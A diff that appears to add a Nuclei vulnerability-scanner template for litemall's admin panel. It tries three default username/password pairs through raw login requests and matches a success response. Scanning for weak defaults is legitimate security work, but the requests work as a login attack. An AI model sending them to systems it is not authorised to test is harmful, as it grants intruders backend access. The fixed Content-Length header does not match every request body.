@@ -1,0 +1,90 @@
+
+id: litemall-default-login
+
+info:
+  name: litemall
+  author: lbb
+  description: litemall存在多个默认口令，攻击者可通过此漏洞进入后台。
+  severity: high
+  reference:
+   - 
+  tags: litemall
+
+http:
+  - raw:
+      - |
+        POST /admin/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 45
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {"username":"admin123","password":"admin123"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        
+      - type: regex
+        part: body
+        regex:
+          - '\{"errno":(\d+),"data":"([a-f0-9\-]+)","errmsg":"([^"]+)"\}'
+        condition: and
+
+  - raw:
+      - |
+        POST /admin/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 45
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {"username":"mall123","password":"mall123"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        
+      - type: regex
+        part: body
+        regex:
+          - '\{"errno":(\d+),"data":"([a-f0-9\-]+)","errmsg":"([^"]+)"\}'
+        condition: and
+
+  - raw:
+      - |
+        POST /admin/auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 45
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {"username":"promotion123","password":"promotion123"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        
+      - type: regex
+        part: body
+        regex:
+          - '\{"errno":(\d+),"data":"([a-f0-9\-]+)","errmsg":"([^"]+)"\}'
+        condition: and
